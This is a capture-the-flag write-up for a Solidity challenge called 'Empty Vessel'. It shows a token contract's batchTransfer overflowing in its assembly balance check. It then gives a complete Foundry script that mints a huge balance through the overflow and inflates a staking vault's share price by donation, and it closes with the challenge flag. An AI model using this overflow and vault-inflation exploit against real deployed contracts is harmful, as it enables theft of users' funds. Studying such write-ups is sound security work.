+++
title = "Empty Vessel"
date = 2025-07-07
authors = ["Anirud"]
+++

## Description

When you speak directly to metal, metal doesn't lie... but it doesn't think either.

## Solution

### Goal

```solidity
function solve()external{
        if(!staked){
            revert Setup__Not__Yet__Staked();
        }
        uint256 assetsReceived=stake.redeemAll(address(this),address(this));
        if(assetsReceived>75_000 ether){
            revert Setup__Chall__Unsolved();
        }
        solved=true;
    }

    function isSolved()public view returns (bool){
        return solved;
    }
```

When we call solve, redeemAll function is called, and the challenge is complete if less than 75000 ether is received.
The goal is to inflate the share value such that less than 75000 ether worth of shares are minted when 100000 ether is staked.

### Vulnerability

```solidity
function batchTransfer(address[] memory receivers,uint256 amount)public returns (bool){
// ...
    if lt(mload(ptr),mul(mload(receivers),amount)){ // exploit here since this is vulnerable to integer overflow during balance check
                    mstore(add(ptr,0x20),0xcf479181)
                    mstore(add(ptr,0x40),mload(ptr))
                    mstore(add(ptr,0x60),mul(mload(receivers),amount))
                    revert(add(add(ptr,0x20),0x1c),0x44)
                }
                
                for {let i:=0x00} lt(i,mload(receivers)) {i:=add(i,0x01)}{
                    mstore(ptr,mload(add(receivers,mul(add(i,0x01),0x20))))
                    mstore(add(ptr,0x20),1)
                    sstore(keccak256(ptr,0x40),add(sload(keccak256(ptr,0x40)),amount))
                }
// ...
}
```

The function is vulnerable to overflow attacks that allows bypassing balance checks. This means you can transfer very large amounts.

### Exploit Strategy

Read the setup contract to understand that the player can claim 1.746 Billion INR tokens to begin with, and the stakeAmount is 100000 ether.
We must exploit the batchTransfer function to increase our token holdings, gain ownership of the pool, and then transfer a significant amount to inflate the pool.

```solidity
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {Setup, Stake, INR} from "src/Setup.sol";

contract Solve is Script {
    function run() external {
        // Replace with the setup instance address given to you
        address setupAddr = ; // Add received setup address after creating an instance

 vm.startBroadcast();
        Setup setup = Setup(setupAddr);
        INR inr = setup.inr();
        Stake stake = setup.stake();
 address player = msg.sender;
 
 // Claim INR tokens (gives 1.74B tokens)
        setup.claim();
        inr.approve(address(stake), type(uint256).max);
        
 // Addresses for inflation attack using batchTransfer
        address[] memory receivers = new address[](2);
 receivers[0] = player;
        receivers[1] = address(0);

 // Transfer large unchecked value to self to later inflate pool
        inr.batchTransfer(receivers, 0x8000000000000000000000000000000000000000000000000000000000000000);

 // Establish ownership in the pool by depositting just 1 INR
        stake.deposit(1, player);
        // Manually transfer 50k INR to the stake pool (inflate it)
        inr.transfer(address(stake), 50_000 ether);

        // Now make Setup stake its 100k INR - this generates fewer shares due to inflated share value
        setup.stakeINR();

        setup.solve();
        // Assert and log result
        require(setup.isSolved(), "Exploit failed");
        console.log("Challenge Solved!");

        vm.stopBroadcast();
    }
}
```

We transfer 50000 ether (or more) into the pool, which increases share value, and when stakeINR stakes 100000 ether, it receives lesser shares than expected (since the pool is inflated). Finally when solve is called, the shares are liquidated at fair value, and we receive lesser tokens than we deposited.

Flag: `bi0sctf{tx:0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f}`
